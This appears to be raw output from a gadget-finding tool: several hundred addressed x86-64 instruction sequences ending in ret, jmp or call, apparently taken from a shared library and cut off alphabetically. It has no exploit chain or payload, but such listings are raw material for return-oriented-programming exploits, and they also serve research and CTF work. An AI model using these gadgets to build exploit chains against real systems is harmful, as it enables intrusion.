0x00002aaaaaad7c33 : int 0x80
0x00002aaaaab9d56f : int 0xa3
0x00002aaaaaaf48f2 : int 0xc1
0x00002aaaaac0743f : int 0xc2
0x00002aaaaac17aaf : int 0xed
0x00002aaaaab4d297 : int 0xf
0x00002aaaaab727f9 : int 0xfd
0x00002aaaaab3cf4c : int 0xfe
0x00002aaaaaad88ab : int 3
0x00002aaaaab20513 : int1 ; adc al, 0 ; call 0x777f6
0x00002aaaaac7f0dd : int1 ; add byte ptr [rax], al ; jo 0x1aa0fd ; jmp qword ptr [rcx]
0x00002aaaaac7f06d : int1 ; add byte ptr [rax], al ; loopne 0x1aa08c ; call qword ptr [rdx]
0x00002aaaaac2a64d : int1 ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab254c6 : int1 ; add eax, r8d ; ret
0x00002aaaaab8e6ea : int1 ; call 0x8e807
0x00002aaaaab8e6e9 : int1 ; call 0x8e808
0x00002aaaaac5c1fe : int1 ; call qword ptr [rax - 0x4f000e16]
0x00002aaaaac5c1de : int1 ; call qword ptr [rax - 0x4f000e17]
0x00002aaaaac5c1be : int1 ; call qword ptr [rax - 0x4f000e18]
0x00002aaaaac5c1ce : int1 ; call qword ptr [rax]
0x00002aaaaac7e43a : int1 ; call qword ptr [rbx]
0x00002aaaaac7d80a : int1 ; call qword ptr [rcx]
0x00002aaaaac7de4a : int1 ; call qword ptr [rdx]
0x00002aaaaac7d5fa : int1 ; call qword ptr [rsi]
0x00002aaaaac5c206 : int1 ; call rax
0x00002aaaaaaf685c : int1 ; call rbx
0x00002aaaaac7e632 : int1 ; call rdi
0x00002aaaaac7e98a : int1 ; call rsi
0x00002aaaaac6c8e2 : int1 ; call rsp
0x00002aaaaabd337e : int1 ; clc ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rbx + 0x48], 0x39 ; ret
0x00002aaaaabe4f68 : int1 ; cmp dil, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaabd372e : int1 ; cmp dl, 0x20 ; je 0xfe72b ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabd6edc : int1 ; dec dword ptr [rax - 0x75] ; jge 0x101ee8 ; call rbx
0x00002aaaaabd718f : int1 ; dec dword ptr [rax - 0x75] ; jge 0x10219b ; call rbx
0x00002aaaaabd8d27 : int1 ; dec dword ptr [rax - 0x75] ; jge 0x103d33 ; call rbx
0x00002aaaaabd6d9a : int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabd719d : int1 ; dec dword ptr [rcx - 0x75] ; cmp al, 0x24 ; call rbx
0x00002aaaaabd6da7 : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x101db3 ; call rbx
0x00002aaaaabd6ece : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x101eda ; call rbx
0x00002aaaaabd7011 : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x10201d ; call rbx
0x00002aaaaabd7181 : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x10218d ; call rbx
0x00002aaaaabd899f : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x1039ab ; call rbx
0x00002aaaaabd8ac7 : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x103ad3 ; call rbx
0x00002aaaaabd8c0a : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x103c16 ; call rbx
0x00002aaaaabd8d0b : int1 ; dec dword ptr [rcx - 0x75] ; jge 0x103d17 ; call rbx
0x00002aaaaac6ca9a : int1 ; dec esp ; and al, byte ptr [rcx] ; add byte ptr [rdi - 0xf], dl ; jmp rsp
0x00002aaaaaad8a9f : int1 ; imul esi ; in eax, 0x78 ; mov dl, 0x1e ; ret
0x00002aaaaac5c26a : int1 ; inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c2de : int1 ; inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac5c25a : int1 ; inc eax ; in al, dx ; int1 ; call rax
0x00002aaaaac5c2ce : int1 ; inc eax ; out dx, al ; int1 ; call rax
0x00002aaaaac5c00a : int1 ; inc eax ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac5c3de : int1 ; inc eax ; push rcx ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaab7302d : int1 ; je 0x9e024 ; ret
0x00002aaaaab7e9db : int1 ; jl 0xa9a2c ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7e9fc : int1 ; jl 0xa9a4d ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7ea0f : int1 ; jl 0xa9a60 ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7eae4 : int1 ; jl 0xa9b35 ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7eb3c : int1 ; jl 0xa9b8d ; adc dword ptr [rsi + 3], edx ; ret
0x00002aaaaab7ebd9 : int1 ; jl 0xa9c2a ; adc dword ptr [rsi + 7], edx ; ret
0x00002aaaaab3146b : int1 ; jmp 0x5c432
0x00002aaaaab3146a : int1 ; jmp 0x5c433
0x00002aaaaac5c21a : int1 ; jmp qword ptr [rax - 0x2f000e15]
0x00002aaaaac5c232 : int1 ; jmp qword ptr [rax]
0x00002aaaaac7d4ea : int1 ; jmp qword ptr [rcx]
0x00002aaaaac7e40a : int1 ; jmp qword ptr [rdi]
0x00002aaaaac5c012 : int1 ; jmp rax
0x00002aaaaab7f0e5 : int1 ; jmp rcx
0x00002aaaaac7da52 : int1 ; jmp rdi
0x00002aaaaac6ca2a : int1 ; jmp rsp
0x00002aaaaab5bc8b : int1 ; mov ah, 0xff ; dec dword ptr [rax - 0x77] ; ret 0xc6eb
0x00002aaaaac69520 : int1 ; mov ch, 0xfd ; call rcx
0x00002aaaaac69540 : int1 ; mov dh, 0xfd ; call rcx
0x00002aaaaac2ef6b : int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac279ef : int1 ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac02bda : int1 ; mov qword ptr [rdx + 0x58], rdi ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaabfe6be : int1 ; mov rdi, r13 ; call r12
0x00002aaaaac0bffa : int1 ; mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaac46203 : int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x00002aaaaab1a37f : int1 ; or al, 0 ; add rsp, 0x80 ; pop rbx ; ret
0x00002aaaaac90980 : int1 ; or byte ptr [rbx], al ; ret
0x00002aaaaab7f12b : int1 ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab6b96e : int1 ; pop rbx ; pop rbp ; ret
0x00002aaaaac5c216 : int1 ; push qword ptr [rax - 0x15] ; int1 ; jmp qword ptr [rax - 0x2f000e15]
0x00002aaaaac5c2ca : int1 ; push qword ptr [rax - 0x3f000e12] ; out dx, al ; int1 ; call rax
0x00002aaaaac5c256 : int1 ; push qword ptr [rax - 0x3f000e14] ; in al, dx ; int1 ; call rax
0x00002aaaaac5c006 : int1 ; push qword ptr [rax - 0x3f000e92] ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac5c392 : int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaac5c266 : int1 ; push rax ; in al, dx ; int1 ; inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c292 : int1 ; push rax ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c2da : int1 ; push rax ; out dx, al ; int1 ; inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac5c3e2 : int1 ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaac5c3b2 : int1 ; push rax ; std ; int1 ; jmp qword ptr [rax]
0x00002aaaaaad760b : int1 ; ret
0x00002aaaaabdbb83 : int1 ; ret 0x2b
0x00002aaaaac59c16 : int1 ; ret 0x5803
0x00002aaaaab1ace3 : int1 ; sal byte ptr [rdi], 1 ; add byte ptr [rax + rcx*2 - 0x75], ah ; add byte ptr [rax - 0x77], cl ; ret 0xde8
0x00002aaaaac6992d : int1 ; sti ; call rax
0x00002aaaaac8a3d9 : int1 ; sti ; call rcx
0x00002aaaaac6996d : int1 ; sti ; inc dword ptr [rax - 0xd] ; sti ; call qword ptr [rax - 0x1f00040c]
0x00002aaaaac46207 : int1 ; sub eax, edx ; ret
0x00002aaaaac071d6 : int1 ; xor eax, eax ; mov rsi, rdx ; add rdi, 0x10 ; jmp rcx
0x00002aaaaab1d1cd : int1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b87e : int1 ; xor eax, eax ; ret
0x00002aaaaabfd4a0 : iretd ; adc dword ptr [rax + rcx*2 + 0x33], esp ; cmp al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00002aaaaac6bde5 : iretd ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; adc al, 0xee ; jmp rsp
0x00002aaaaac6e77d : iretd ; add dword ptr [rax], eax ; je 0x199797 ; clc ; jmp rsp
0x00002aaaaabc8657 : iretd ; call 0x1f8ab
0x00002aaaaab5d6b9 : iretd ; mov qword ptr [rbx], rsi ; mov qword ptr [rbx + 0x48], r9 ; call rcx
0x00002aaaaac697bd : iretd ; sti ; push qword ptr [rax - 0x30] ; sti ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaabd9ad4 : ja 0x104ae3 ; ret
0x00002aaaaabdb794 : ja 0x1067a3 ; ret
0x00002aaaaabdb9d6 : ja 0x1069e2 ; ret
0x00002aaaaabdba88 : ja 0x106a93 ; ret
0x00002aaaaabdbac2 : ja 0x106ad3 ; ret
0x00002aaaaabdc673 : ja 0x107682 ; ret
0x00002aaaaabdc7f3 : ja 0x107802 ; ret
0x00002aaaaabdcc8d : ja 0x107c92 ; ret
0x00002aaaaabdcd2f : ja 0x107d3a ; ret
0x00002aaaaabdcddf : ja 0x107dea ; ret
0x00002aaaaabe9c40 : ja 0x114c4b ; ret
0x00002aaaaabe9cc5 : ja 0x114c9c ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe9ced : ja 0x114d0d ; ret
0x00002aaaaabeb9b2 : ja 0x1169c3 ; ret
0x00002aaaaabeba62 : ja 0x116a73 ; ret
0x00002aaaaabed4a7 : ja 0x1184ba ; mov rax, rdi ; sar rax, 6 ; ret
0x00002aaaaabf8023 : ja 0x123028 ; ret
0x00002aaaaabf8350 : ja 0x12333b ; mov eax, 0xffffffff ; ret
0x00002aaaaabf83f9 : ja 0x123410 ; shl esi, 4 ; lea eax, dword ptr [rsi + 8] ; ret
0x00002aaaaabfce5f : ja 0x127e7a ; sub rsp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabffba1 : ja 0x12abf4 ; mov rdi, rax ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaac02bfd : ja 0x12dbee ; mov qword ptr [rdx + 0x20], rsi ; ret
0x00002aaaaac08e51 : ja 0x133e62 ; add byte ptr [rax + 0x63], cl ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaac08e50 : ja 0x133e63 ; add byte ptr [rax + 0x63], cl ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaac101d2 : ja 0x13b1f6 ; mov dword ptr [rdi + 0x28], edx ; mov eax, 1 ; ret
0x00002aaaaac101f7 : ja 0x13b213 ; ret
0x00002aaaaac1036f : ja 0x13b392 ; mov dword ptr [rdi + 0x28], edx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaac105eb : ja 0x13b618 ; jbe 0x13b60b ; add dword ptr [rdi + 0x28], esi ; mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaac105f0 : ja 0x13b620 ; mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaac32d87 : ja 0x15dd97 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac32fca : ja 0x15dfda ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac485d0 : ja 0x17359c ; call 0x1f8ac
0x00002aaaaac489cb : ja 0x1739d2 ; ret
0x00002aaaaac59c84 : ja 0x184c0b ; ret 0x48f
0x00002aaaaac6935d : ja 0x19435c ; jmp qword ptr [rax]
0x00002aaaaac6a291 : ja 0x195291 ; jmp rax
0x00002aaaaac6a2cd : ja 0x1952cd ; call qword ptr [rsi]
0x00002aaaaac6a40d : ja 0x19540d ; jmp rsp
0x00002aaaaac6a48d : ja 0x19548d ; call rax
0x00002aaaaac6a489 : ja 0x19548d ; inc dword ptr [rax + 0x77] ; cld ; call rax
0x00002aaaaac6a48c : ja 0x19548e ; call rax
0x00002aaaaac6a4cd : ja 0x1954cd ; call rax
0x00002aaaaac6a4c9 : ja 0x1954cd ; push qword ptr [rax] ; ja 0x1954d1 ; call rax
0x00002aaaaac6afe5 : ja 0x195fed ; add byte ptr [rcx + rsi*8 - 0x17], al ; call rsp
0x00002aaaaac6b921 : ja 0x196912 ; jmp rsp
0x00002aaaaac6fda9 : ja 0x19adaa ; call rsp
0x00002aaaaac6fda8 : ja 0x19adab ; call rsp
0x00002aaaaaaf6a2b : ja 0x21a3e ; add byte ptr [rsi - 0x70], ah ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab02a62 : ja 0x2da7e ; lea rax, qword ptr [rdi + rsi*4] ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaab02aad : ja 0x2dac8 ; lea rax, qword ptr [rdi + rsi*4] ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaab0a42e : ja 0x35453 ; ret
0x00002aaaaab0a736 : ja 0x35743 ; ret
0x00002aaaaab0a7a2 : ja 0x357b3 ; ret
0x00002aaaaab0a7ec : ja 0x357f2 ; ret
0x00002aaaaaad88ea : ja 0x394c ; clc ; salc ; jb 0x3972 ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaaad8cd7 : ja 0x3ca0 ; hlt ; test al, 0x35 ; push rbx ; or byte ptr fs:[rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaab1da8e : ja 0x48ae0 ; shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaab254b7 : ja 0x5049e ; mov eax, r8d ; ret
0x00002aaaaab3682c : ja 0x617b9 ; ret 0x348
0x00002aaaaab37b53 : ja 0x62ae0 ; ret 0x348
0x00002aaaaab3ec78 : ja 0x69c05 ; ret 0x348
0x00002aaaaab48026 : ja 0x73033 ; ret
0x00002aaaaab4cc88 : ja 0x77ca1 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4cd35 : ja 0x77d53 ; add rsp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab59992 : ja 0x8492e ; movsxd rax, dword ptr [r13 + rax*4] ; add rax, r13 ; jmp rax
0x00002aaaaab636c2 : ja 0x8e6d3 ; ret
0x00002aaaaab688c8 : ja 0x938c2 ; ret 0x7401
0x00002aaaaab6b28d : ja 0x9626f ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab73cac : ja 0x9ecc5 ; mov rax, rdi ; ret
0x00002aaaaab74433 : ja 0x9f437 ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab74b86 : ja 0x9fb8a ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab752d3 : ja 0xa02d7 ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab7a1a7 : ja 0xa51ad ; ret
0x00002aaaaab7a1c3 : ja 0xa51cd ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7a204 : ja 0xa5213 ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a289 : ja 0xa529d ; ret
0x00002aaaaab7a2df : ja 0xa52f7 ; ret
0x00002aaaaab7a361 : ja 0xa537d ; ret
0x00002aaaaab7b7a7 : ja 0xa67b1 ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7b7c3 : ja 0xa67d1 ; mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7b814 : ja 0xa6827 ; mov qword ptr [rdi], rcx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7b8f9 : ja 0xa6911 ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b96f : ja 0xa698b ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7b9f1 : ja 0xa6a11 ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7d287 : ja 0xa828d ; ret
0x00002aaaaab7d2a3 : ja 0xa82ad ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7d2e4 : ja 0xa82f3 ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7d369 : ja 0xa837d ; ret
0x00002aaaaab7d3bf : ja 0xa83d7 ; ret
0x00002aaaaab7d441 : ja 0xa845d ; ret
0x00002aaaaab7dd57 : ja 0xa8d5d ; ret
0x00002aaaaab7dd73 : ja 0xa8d7d ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7ddb4 : ja 0xa8dc3 ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7de39 : ja 0xa8e4d ; ret
0x00002aaaaab7de8f : ja 0xa8ea7 ; ret
0x00002aaaaab7df11 : ja 0xa8f2d ; ret
0x00002aaaaab7f3d9 : ja 0xaa3f9 ; sub rdi, 0x10 ; add rax, rdi ; ret
0x00002aaaaab80b84 : ja 0xabbd5 ; test ebx, ebx ; jne 0xabb6a ; mov rax, rdi ; ret
0x00002aaaaab80c72 : ja 0xabc82 ; cmove rax, rcx ; ret
0x00002aaaaab8106c : ja 0xac07c ; mov eax, edi ; ret
0x00002aaaaab9088d : ja 0xbb89b ; ret
0x00002aaaaab9c82d : ja 0xc783b ; pop rbx ; ret
0x00002aaaaab9daa7 : ja 0xc8ab2 ; ret
0x00002aaaaaba0436 : ja 0xcb442 ; ret
0x00002aaaaaba04d0 : ja 0xcb4da ; ret
0x00002aaaaaba05c1 : ja 0xcb5ca ; ret
0x00002aaaaaba1719 : ja 0xcc722 ; ret
0x00002aaaaaba1789 : ja 0xcc792 ; ret
0x00002aaaaaba19dd : ja 0xcc9e2 ; ret
0x00002aaaaaba1a5d : ja 0xcca62 ; ret
0x00002aaaaabad25e : ja 0xd8277 ; mov eax, 2 ; ret
0x00002aaaaabad5b7 : ja 0xd827b ; mov eax, 6 ; ret
0x00002aaaaabca391 : ja 0xf539b ; xor eax, eax ; ret
0x00002aaaaabcae2e : ja 0xf5dc6 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcae62 : ja 0xf5e53 ; ret
0x00002aaaaabcb00b : ja 0xf6013 ; ret
0x00002aaaaabcb05a : ja 0xf6063 ; ret
0x00002aaaaabcb0ab : ja 0xf60b3 ; ret
0x00002aaaaabcb103 : ja 0xf6113 ; ret
0x00002aaaaabcb167 : ja 0xf6173 ; ret
0x00002aaaaabcb1c0 : ja 0xf61cb ; ret
0x00002aaaaabcb39f : ja 0xf63ab ; ret
0x00002aaaaabcba69 : ja 0xf6aa3 ; ret
0x00002aaaaabcbb0d : ja 0xf6b57 ; add rsp, 0x60 ; pop rbx ; ret
0x00002aaaaabcf9b3 : ja 0xfa9c8 ; mov word ptr [rsi + 0x66], dx ; xor eax, eax ; ret
0x00002aaaaabcfbd3 : ja 0xfac52 ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcfee8 : ja 0xfaef3 ; ret
0x00002aaaaabcff3c : ja 0xfaf43 ; ret
0x00002aaaaabd0690 : ja 0xfb69a ; ret
0x00002aaaaabd0773 : ja 0xfb77f ; ret
0x00002aaaaabd07c9 : ja 0xfb7d5 ; ret
0x00002aaaaabd0bb4 : ja 0xfbbc2 ; ret
0x00002aaaaabd1243 : ja 0xfc273 ; ret
0x00002aaaaabd1460 : ja 0xfc46a ; ret
0x00002aaaaabd1510 : ja 0xfc51a ; ret
0x00002aaaaabd15bb : ja 0xfc5c2 ; ret
0x00002aaaaabd162b : ja 0xfc632 ; ret
0x00002aaaaabd16ac : ja 0xfc6b2 ; ret
0x00002aaaaabd175c : ja 0xfc762 ; ret
0x00002aaaaabd1cac : ja 0xfccb3 ; ret
0x00002aaaaabd33cd : ja 0xfe3db ; ret
0x00002aaaaabd3461 : ja 0xfe46b ; ret
0x00002aaaaabd3501 : ja 0xfe50b ; ret
0x00002aaaaabd3555 : ja 0xfe563 ; ret
0x00002aaaaabd3639 : ja 0xfe645 ; ret
0x00002aaaaabd3862 : ja 0xfe898 ; add byte ptr [rax - 0x76b7ffc8], al ; ret
0x00002aaaaaad72df : ja 0xffffffffd6104b6b ; ret
0x00002aaaaabd58ef : jae 0x1008f4 ; ret
0x00002aaaaabd5b5d : jae 0x100b62 ; ret
0x00002aaaaabd5b8d : jae 0x100b92 ; ret
0x00002aaaaabd5bc6 : jae 0x100bfb ; ret
0x00002aaaaabd5c1d : jae 0x100c22 ; ret
0x00002aaaaabd5c4d : jae 0x100c52 ; ret
0x00002aaaaabd5c80 : jae 0x100c85 ; ret
0x00002aaaaabd5cad : jae 0x100cb2 ; ret
0x00002aaaaabd5cdd : jae 0x100ce2 ; ret
0x00002aaaaabd5d0d : jae 0x100d12 ; ret
0x00002aaaaabd5d3d : jae 0x100d42 ; ret
0x00002aaaaabda400 : jae 0x105405 ; ret
0x00002aaaaabda42d : jae 0x105432 ; ret
0x00002aaaaabda45d : jae 0x105462 ; ret
0x00002aaaaabda490 : jae 0x105495 ; ret
0x00002aaaaabda4c0 : jae 0x1054c5 ; ret
0x00002aaaaabda4ed : jae 0x1054f2 ; ret
0x00002aaaaabda520 : jae 0x105525 ; ret
0x00002aaaaabda54d : jae 0x105552 ; ret
0x00002aaaaabda57d : jae 0x105582 ; ret
0x00002aaaaabda5b0 : jae 0x1055b5 ; ret
0x00002aaaaabda5dd : jae 0x1055e2 ; ret
0x00002aaaaabda610 : jae 0x105615 ; ret
0x00002aaaaabdb6fd : jae 0x106702 ; ret
0x00002aaaaabdb72d : jae 0x106732 ; ret
0x00002aaaaabdb85d : jae 0x106862 ; ret
0x00002aaaaabdb89d : jae 0x1068a2 ; ret
0x00002aaaaabdb8cd : jae 0x1068d2 ; ret
0x00002aaaaabdb8fd : jae 0x106902 ; ret
0x00002aaaaabdb92d : jae 0x106932 ; ret
0x00002aaaaabdbb50 : jae 0x106b55 ; ret
0x00002aaaaabdbb50 : jae 0x106b5a ; ret
0x00002aaaaabdbb7d : jae 0x106b82 ; ret
0x00002aaaaabdbbad : jae 0x106bb2 ; ret
0x00002aaaaabdbbdd : jae 0x106be2 ; ret
0x00002aaaaabdbc20 : jae 0x106c25 ; ret
0x00002aaaaabdbc4d : jae 0x106c52 ; ret
0x00002aaaaabdbc7d : jae 0x106c82 ; ret
0x00002aaaaabdbcad : jae 0x106cb2 ; ret
0x00002aaaaabdbcdd : jae 0x106ce2 ; ret
0x00002aaaaabdbd0d : jae 0x106d12 ; ret
0x00002aaaaabdbd3d : jae 0x106d42 ; ret
0x00002aaaaabdbd6d : jae 0x106d72 ; ret
0x00002aaaaabdbd9d : jae 0x106da2 ; ret
0x00002aaaaabdbdd0 : jae 0x106dd5 ; ret
0x00002aaaaabdbe09 : jae 0x106e41 ; ret
0x00002aaaaabdbe5d : jae 0x106e62 ; ret
0x00002aaaaabdbe90 : jae 0x106e95 ; ret
0x00002aaaaabdbebd : jae 0x106ec2 ; ret
0x00002aaaaabdbeed : jae 0x106ef2 ; ret
0x00002aaaaabdbf1d : jae 0x106f22 ; ret
0x00002aaaaabdbf4d : jae 0x106f52 ; ret
0x00002aaaaabdbf7d : jae 0x106f82 ; ret
0x00002aaaaabdbfb0 : jae 0x106fb5 ; ret
0x00002aaaaabdbfe0 : jae 0x106fe5 ; ret
0x00002aaaaabdc00d : jae 0x107012 ; ret
0x00002aaaaabdc03d : jae 0x107042 ; ret
0x00002aaaaabdc070 : jae 0x107075 ; ret
0x00002aaaaabdc0a0 : jae 0x1070a5 ; ret
0x00002aaaaabdc0d0 : jae 0x1070d5 ; ret
0x00002aaaaabdc109 : jae 0x107141 ; ret
0x00002aaaaabdc15d : jae 0x107162 ; ret
0x00002aaaaabdc199 : jae 0x1071d1 ; ret
0x00002aaaaabdc1ed : jae 0x1071f2 ; ret
0x00002aaaaabdc21d : jae 0x107222 ; ret
0x00002aaaaabdc259 : jae 0x107291 ; ret
0x00002aaaaabdc2ad : jae 0x1072b2 ; ret
0x00002aaaaabdc2e0 : jae 0x1072e5 ; ret
0x00002aaaaabdc30d : jae 0x107312 ; ret
0x00002aaaaabdc33d : jae 0x107342 ; ret
0x00002aaaaabdc370 : jae 0x107375 ; ret
0x00002aaaaabdc3a6 : jae 0x1073db ; ret
0x00002aaaaabdc3fd : jae 0x107402 ; ret
0x00002aaaaabdc430 : jae 0x107435 ; ret
0x00002aaaaabdc460 : jae 0x107465 ; ret
0x00002aaaaabdc4b6 : jae 0x1074eb ; ret
0x00002aaaaabdc50d : jae 0x107512 ; ret
0x00002aaaaabdc546 : jae 0x10757b ; ret
0x00002aaaaabdc59d : jae 0x1075a2 ; ret
0x00002aaaaabdc5cd : jae 0x1075d2 ; ret
0x00002aaaaabdc600 : jae 0x107605 ; ret
0x00002aaaaabdc62d : jae 0x107632 ; ret
0x00002aaaaabdc729 : jae 0x107761 ; ret
0x00002aaaaabdc786 : jae 0x1077bb ; ret
0x00002aaaaabdc8a6 : jae 0x1078db ; ret
0x00002aaaaabdc909 : jae 0x107941 ; ret
0x00002aaaaabdc960 : jae 0x107965 ; ret
0x00002aaaaabdc98d : jae 0x107992 ; ret
0x00002aaaaabdc9bd : jae 0x1079c2 ; ret
0x00002aaaaabdc9f0 : jae 0x1079f5 ; ret
0x00002aaaaabdcf49 : jae 0x107f81 ; ret
0x00002aaaaabdcfa9 : jae 0x107fe1 ; ret
0x00002aaaaabdcffd : jae 0x108002 ; ret
0x00002aaaaabdd02d : jae 0x108032 ; ret
0x00002aaaaabdd05d : jae 0x108062 ; ret
0x00002aaaaabdd08d : jae 0x108092 ; ret
0x00002aaaaabdd0c0 : jae 0x1080c5 ; ret
0x00002aaaaabdd0f0 : jae 0x1080f5 ; ret
0x00002aaaaabdd11d : jae 0x108122 ; ret
0x00002aaaaabdd14d : jae 0x108152 ; ret
0x00002aaaaabdd17d : jae 0x108182 ; ret
0x00002aaaaabdd1ad : jae 0x1081b2 ; ret
0x00002aaaaabe387c : jae 0x10e8a7 ; cmp byte ptr [rax], dil ; je 0x10e8b1 ; mov rdx, rax ; jmp 0x10e89e
0x00002aaaaabe3b87 : jae 0x10ebae ; cmp byte ptr [r8], r9b ; je 0x10ebb5 ; mov rdx, r8 ; jmp 0x10eba5
0x00002aaaaabf8599 : jae 0x1235b3 ; shl rsi, 4 ; lea rax, qword ptr [rdi + rsi + 8] ; ret
0x00002aaaaac102d5 : jae 0x13b2e4 ; xor eax, eax ; ret
0x00002aaaaac10315 : jae 0x13b324 ; xor eax, eax ; ret
0x00002aaaaac14ab0 : jae 0x13fab5 ; ret
0x00002aaaaac14b00 : jae 0x13fb05 ; ret
0x00002aaaaac17904 : jae 0x1428e7 ; mov eax, 1 ; ret
0x00002aaaaac1ecaa : jae 0x149cab ; movsxd rax, ecx ; add rax, rdi ; sub rax, rdx ; ret
0x00002aaaaac2207e : jae 0x14d09a ; mov rcx, rdx ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac2255e : jae 0x14d57a ; mov rcx, rdx ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac228fe : jae 0x14d91a ; mov rcx, rdx ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac33207 : jae 0x15e217 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac3344a : jae 0x15e45a ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac4878c : jae 0x17379b ; call qword ptr [rbx]
0x00002aaaaac4878c : jae 0x17379f ; call qword ptr [rbx]
0x00002aaaaac49547 : jae 0x174564 ; nop dword ptr [rax] ; call qword ptr [rbx]
0x00002aaaaac58242 : jae 0x183224 ; jo 0x1832c0 ; mov ebp, 0xfb67d10d ; ret
0x00002aaaaac590de : jae 0x1840b9 ; push rsi ; pop rdx ; je 0x1840ae ; ret 0xacfc
0x00002aaaaac69351 : jae 0x194354 ; jmp qword ptr [rax + 0x20fffb74]
0x00002aaaaac6d5bd : jae 0x1985c6 ; add byte ptr [rbp + rax - 0xa], dh ; call rsp
0x00002aaaaac6fcc9 : jae 0x19acc8 ; call rsp
0x00002aaaaac75869 : jae 0x1a0881 ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaac761b5 : jae 0x1a11cd ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaac76a77 : jae 0x1a1a85 ; ret
0x00002aaaaac7ab29 : jae 0x1a5b1b ; jmp qword ptr [rdx]
